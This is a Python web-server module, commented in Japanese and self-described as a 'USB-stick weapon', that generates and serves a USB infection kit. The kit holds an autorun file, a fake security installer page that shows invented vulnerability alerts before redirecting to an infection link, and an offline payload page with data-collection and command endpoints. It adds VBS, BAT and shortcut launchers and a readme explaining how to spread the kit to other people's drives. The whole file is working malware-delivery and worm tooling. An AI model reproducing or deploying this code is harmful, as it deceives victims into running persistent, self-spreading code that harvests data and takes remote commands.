"""USBメモリー型 兵器（SINGULARITY ULTIMATE ver.）

  GET  /usb               ツール本体（要ログイン）
  GET  /usb/manifest      書き込むファイル一覧（公開・JSON）
  GET  /usb/file/{idx}    ファイル本体（公開）
  GET  /usb/zip           一括ZIP（要ログイン）
  POST /usb/new           特異点リンクを新規作成
  GET  /usb/health        生存確認

USBのルートに置く生成物:
  autorun.inf     AutoPlay から起動させる定義（アイコン・ラベルも指定）
  START.html      偽インストーラー。オンラインなら感染URLへ、オフラインなら offline.html へ
  offline.html    感染体そのもの（ネット不要で動く完全版）
  icon.ico        ドライブアイコン
  <ラベル>.url    ダブルクリックで起動（コンソール無し・最安全）
  <ラベル>.vbs    ダブルクリックで起動（無音・無窓）
  install.bat     どこでも動く最終フォールバック
  はじめに.txt     手順書

設計メモ:
  ・manifest / file は公開。感染した相手（未ログイン）が自分のUSBに再武装できるようにする
  ・autorun.inf は UTF-16LE+BOM（Windows の profile API は Unicode を扱える）
  ・ファイル名が日本語なので、manifest は idx 方式にしてURLエンコード事故を避ける
  ・既存ファイルは同名のみ上書き。USBの中身は消さない
  ・offline.html は hop=1 を持ち、オンラインなら本体URLへ増援タブを開く
"""
from __future__ import annotations

import io
import json
import struct
import zipfile
from urllib.parse import quote

from fastapi import APIRouter, Request, Depends, Form, HTTPException
from fastapi.responses import (HTMLResponse, RedirectResponse, Response,
                               JSONResponse, PlainTextResponse)

from . import tenancy, users, virus
from .singularity import LEVEL_LABEL, PAYLOAD_JS, WORKER_JS

router = APIRouter()

DEFAULT_LABEL = "保護ツール"
DEFAULT_LEVEL = 5


def _m():
    from . import main
    return main


async def _auth(request: Request):
    return await _m().auth(request)


def _base(request: Request):
    return _m()._base(request).rstrip("/")


def _owner(code: str):
    """リンクの所有者を推定（未ログインでも動くように）。"""
    try:
        o = users.owner_of_link(code)
    except Exception:
        o = None
    if o:
        try:
            tenancy.set_current(o)
        except Exception:
            pass
    return o


def _lv(v) -> int:
    try:
        return max(0, min(5, int(v)))
    except Exception:
        return DEFAULT_LEVEL


def _lb(v) -> str:
    s = (v or "").strip()
    for c in '\\/:*?"<>|':
        s = s.replace(c, "")
    return s[:32] or DEFAULT_LABEL


def _tag(v) -> str:
    return "".join(c for c in (v or "") if c.isalnum() or c in "-_")[:24]


def _win(v) -> int:
    try:
        return max(0, min(32, int(v)))
    except Exception:
        return 0


def _esc(s: str) -> str:
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


# ---------------- 生成物 ----------------

def _autorun(label: str) -> bytes:
    text = (
        "[AutoRun]\r\n"
        "open=START.html\r\n"
        "icon=icon.ico\r\n"
        "label=" + label + "\r\n"
        "action=" + label + "を実行\r\n"
        "\r\n"
        "[Content]\r\n"
        "MusicFiles=0\r\n"
        "PictureFiles=0\r\n"
        "VideoFiles=0\r\n"
        "\r\n"
        "[DeviceInstall]\r\n"
    )
    try:
        return ("\ufeff" + text).encode("utf-16-le")
    except Exception:
        return text.encode("cp932", "replace")


_START_HTML = """<!doctype html>
<html lang="ja"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>__LABEL__ セットアップ</title>
<style>
html,body{margin:0;height:100%;background:#05070a;color:#d8ffe9;
  font:14px/1.7 system-ui,-apple-system,"Segoe UI","Hiragino Sans",sans-serif}
body{display:grid;place-items:center}
.box{width:min(460px,86vw);text-align:center}
.ic{font-size:54px;line-height:1}
h1{font-size:17px;margin:12px 0 4px;color:#7ee08a;font-weight:700}
.sub{font-size:12px;color:#5f8f77;margin-bottom:20px}
.bar{height:8px;background:#0d1a14;border:1px solid #1f5c42;border-radius:99px;overflow:hidden}
.bar i{display:block;height:100%;width:0;
  background:linear-gradient(90deg,#00c46a,#7ee08a);transition:width .3s}
.st{font-size:12px;color:#9fd8bb;margin-top:10px;min-height:18px}
.foot{font-size:11px;color:#3f7a5f;margin-top:18px}
</style></head><body>
<div class="box">
  <div class="ic">&#128737;</div>
  <h1>__LABEL__</h1>
  <div class="sub">システム保護セットアップ</div>
  <div class="bar"><i id="p"></i></div>
  <div class="st" id="s">システムを確認しています&hellip;</div>
  <div class="foot">クリックで今すぐ開始</div>
</div>
<script>
var URL = "__URL__";
var OFF = "offline.html";
var S = ["システムを確認しています&hellip;","脆弱性を検出しました（3件）",
         "保護モジュールを展開しています&hellip;","開始します&hellip;"];
var i = 0, done = false, online = null;
var p = document.getElementById("p"), s = document.getElementById("s");
function go(){ if (done) return; done = true; location.replace(online ? URL : OFF); }
var t = setInterval(function(){
  i++; p.style.width = Math.min(100, i * 25) + "%";
  if (S[i-1]) s.textContent = S[i-1];
  if (i >= 4) { clearInterval(t); setTimeout(go, 250); }
}, 280);
/* オンライン判定（3.2秒でオフラインとみなす） */
Promise.race([
  fetch(URL, { mode: "no-cors", cache: "no-store" })
    .then(function(){ online = true; }).catch(function(){ online = false; }),
  new Promise(function(r){ setTimeout(function(){ if (online === null) online = false; r(); }, 3200); })
]).then(function(){ if (i >= 4) setTimeout(go, 100); });
addEventListener("click", go);
</script>
</body></html>
"""


def _start_html(url: str, label: str) -> bytes:
    return _START_HTML.replace("__LABEL__", _esc(label)).replace("__URL__", url).encode("utf-8")


def _offline_html(server: str, code: str, level: int, tag: str, label: str) -> bytes:
    """ネットが無くても動く感染体そのもの。"""
    cfg = {
        "path": server + f"/v/{code}/sg",
        "collect": server + f"/v/{code}/sg/c",
        "cmd": server + f"/v/{code}/sg/cmd",
        "sw": server + f"/v/{code}/sg/sw.js",
        "manifest": server + f"/v/{code}/sg/manifest.json",
        "usbBase": server, "code": code, "usbCode": code,
        "level": level, "fire": 1, "wipe": False, "w": 0,
        "install": "off", "installLevel": level,
        "avName": label, "usbWorm": True, "usbLabel": label, "hop": True,
    }
    if tag:
        cfg["usbTag"] = tag
    head = (
        "<!doctype html><html lang=\"ja\"><head><meta charset=\"utf-8\">"
        "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
        f"<title>{_esc(label)}</title>"
        "<style>html,body{margin:0;height:100%;background:#05070a;color:#00ff88;"
        "font:12px/1.6 ui-monospace,Menlo,monospace;overflow:hidden}"
        "body{display:grid;place-items:center}"
        "#sg{text-align:center;opacity:.9;padding-bottom:52px}"
        ".d{color:#3f7a5f;font-size:10.5px;margin-top:5px}</style></head><body>"
        "<div id=\"sg\"><b>SINGULARITY</b><div class=\"d\">offline / L" + str(level) + "</div></div>"
    )
    script = (
        "<script>window.__SINGULARITY_CFG__=" + json.dumps(cfg, ensure_ascii=False)
        + ";window.__SINGULARITY_WORKER__=" + json.dumps(WORKER_JS) + ";</script>\n"
        "<script>" + PAYLOAD_JS + "</script>"
    )
    return (head + script + "</body></html>").encode("utf-8")


def _urlfile(url: str) -> bytes:
    return ("[InternetShortcut]\r\nURL=" + url + "\r\n").encode("ascii", "replace")


def _vbs(url: str) -> bytes:
    return ('CreateObject("Shell.Application").ShellExecute "' + url + '"\r\n'
            ).encode("ascii", "replace")


def _bat(url: str) -> bytes:
    return ('@echo off\r\nstart "" "' + url + '"\r\n').encode("ascii", "replace")


def _readme(url: str, label: str) -> bytes:
    t = (
        "■ " + label + " — USBセットアップ手順\r\n"
        "\r\n"
        "1) このUSBを、保護したいパソコンに挿してください。\r\n"
        "2) 「自動再生（AutoPlay）」の画面が出たら\r\n"
        "   「" + label + "を実行」を選んでください。\r\n"
        "3) 画面が出ない場合は、このUSBの中の\r\n"
        "   「" + label + ".url」をダブルクリックしてください。\r\n"
        "4) ブラウザが開き、セットアップが始まります。\r\n"
        "   「今すぐインストール」を押すと常駐します。\r\n"
        "\r\n"
        "■ ネットが無いPCでも動きます\r\n"
        "・その場合は START.html（または offline.html）を開いてください。\r\n"
        "\r\n"
        "■ 相手のUSBにも伝染させたいとき\r\n"
        "・感染した画面の右下の「🔌 USBにも仕込む」を1回押すだけ。\r\n"
        "・次にそのUSBを別のPCに挿すと、同じことが起きます。\r\n"
        "\r\n"
        "■ うまく動かないとき\r\n"
        "・自動再生が出ない → 「" + label + ".url」をダブルクリック\r\n"
        "・それでもダメ → 「install.bat」をダブルクリック\r\n"
        "\r\n"
        "■ 直接URL\r\n"
        + url + "\r\n"
        "\r\n"
        "■ メモ\r\n"
        "・インストール後は、PCを再起動しても自動で動きます。\r\n"
        "・消すには chrome://apps からアンインストール＋サイトデータ消去。\r\n"
    )
    return ("\ufeff" + t).encode("utf-8")


def _ico() -> bytes:
    """256x256 PNG を ICO コンテナに包む（Vista+ は PNG-in-ICO を解釈する）。"""
    try:
        png = virus._sg_icon(256)
    except Exception:
        png = b""
    if not png:
        return b""
    n = len(png)
    hdr = struct.pack("<HHH", 0, 1, 1)
    ent = struct.pack("<BBBBHHII", 0, 0, 0, 0, 1, 32, n, 22)
    return hdr + ent + png


def _url(base: str, code: str, level: int, tag: str, windows: int) -> str:
    u = f"{base}/v/{code}?level={level}&w={windows}"
    if tag:
        u += "&u=" + tag
    return u


def _files(base: str, code: str, level: int, label: str, tag: str, windows: int):
    u = _url(base, code, level, tag, windows)
    out = [
        ("autorun.inf", _autorun(label)),
        ("START.html", _start_html(u, label)),
        ("offline.html", _offline_html(base, code, level, tag, label)),
        ("icon.ico", _ico()),
        (label + ".url", _urlfile(u)),
        (label + ".vbs", _vbs(u)),
        ("install.bat", _bat(u)),
        ("はじめに.txt", _readme(u, label)),
    ]
    return [(n, d) for n, d in out if d]


def _mime(name: str, dl: bool) -> str:
    if name.endswith(".html"):
        return "text/html; charset=utf-8"
    if name.endswith(".ico"):
        return "image/x-icon"
    return "application/octet-stream" if dl else "text/plain; charset=utf-8"


def _links(owner: str):
    c = virus._db(owner)
    rows = [dict(r) for r in c.execute(
        "SELECT code,name,mode,hits,level,active,created FROM virus_links "
        "ORDER BY created DESC").fetchall()]
    c.close()
    return rows


# ---------------- 画面 ----------------

@router.get("/usb", response_class=HTMLResponse)
def page(request: Request, code: str = "", level: int = DEFAULT_LEVEL,
         label: str = DEFAULT_LABEL, windows: int = 0, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    links = _links(owner)
    if code and not any(l["code"] == code for l in links):
        code = ""
    if not code:
        sg = [l for l in links if l["mode"] == "singularity"]
        code = (sg[0]["code"] if sg else (links[0]["code"] if links else ""))
    return _m().render("usb.html", request, links=links, code=code, level=_lv(level),
                       label=_lb(label), windows=_win(windows), base=_base(request),
                       levels=LEVEL_LABEL, default_label=DEFAULT_LABEL)


@router.post("/usb/new")
def newlink(request: Request, name: str = Form("USB"), level: int = Form(DEFAULT_LEVEL),
            u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = virus._db(owner)
    code = virus._new_code(c)
    c.execute("INSERT INTO virus_links(code,name,mode,note,dest,active,created,hits,"
              "winset,firing,seq,notify,notify_text,notify_mode,level) "
              "VALUES(?,?,?,?,?,1,?,0,?,1,0,?,?,?,?)",
              (code, (name or "USB")[:40], "singularity", "USB経由", "", virus._now(),
               100, 0, virus.DEFAULT_NOTIFY, "", _lv(level)))
    c.commit()
    c.close()
    try:
        users.register_link(code, u)
    except Exception:
        pass
    return RedirectResponse(f"/usb?code={code}&level={_lv(level)}", status_code=303)


# ---------------- 生成物の配信（公開） ----------------

@router.get("/usb/manifest")
def manifest(request: Request, code: str, level: int = DEFAULT_LEVEL,
             label: str = DEFAULT_LABEL, tag: str = "", windows: int = 0):
    if not _owner(code):
        raise HTTPException(404)
    base = _base(request)
    files = _files(base, code, _lv(level), _lb(label), _tag(tag), _win(windows))
    return {
        "ok": 1,
        "url": _url(base, code, _lv(level), _tag(tag), _win(windows)),
        "label": _lb(label),
        "files": [{"name": n, "idx": i, "size": len(d)} for i, (n, d) in enumerate(files)],
        "total": sum(len(d) for _, d in files),
    }


@router.get("/usb/file/{idx}")
def getfile(idx: int, request: Request, code: str, level: int = DEFAULT_LEVEL,
            label: str = DEFAULT_LABEL, tag: str = "", windows: int = 0,
            dl: int = 0):
    if not _owner(code):
        raise HTTPException(404)
    files = _files(_base(request), code, _lv(level), _lb(label), _tag(tag), _win(windows))
    if idx < 0 or idx >= len(files):
        raise HTTPException(404)
    name, data = files[idx]
    headers = {"Cache-Control": "no-store"}
    if dl:
        headers["Content-Disposition"] = "attachment; filename*=UTF-8''" + quote(name)
    return Response(data, media_type=_mime(name, bool(dl)), headers=headers)


@router.get("/usb/zip")
def zipall(request: Request, code: str, level: int = DEFAULT_LEVEL,
           label: str = DEFAULT_LABEL, tag: str = "", windows: int = 0,
           u=Depends(_auth)):
    files = _files(_base(request), code, _lv(level), _lb(label), _tag(tag), _win(windows))
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for n, d in files:
            z.writestr(n, d)
    return Response(buf.getvalue(), media_type="application/zip", headers={
        "Content-Disposition": "attachment; filename*=UTF-8''singularity-usb.zip",
        "Cache-Control": "no-store",
    })


@router.get("/usb/icon.ico")
def icon():
    d = _ico()
    if not d:
        raise HTTPException(404)
    return Response(d, media_type="image/x-icon",
                    headers={"Cache-Control": "public, max-age=86400"})


@router.get("/usb/health")
def health():
    return {"ok": True, "pil": bool(getattr(virus, "_SG_PIL", False))}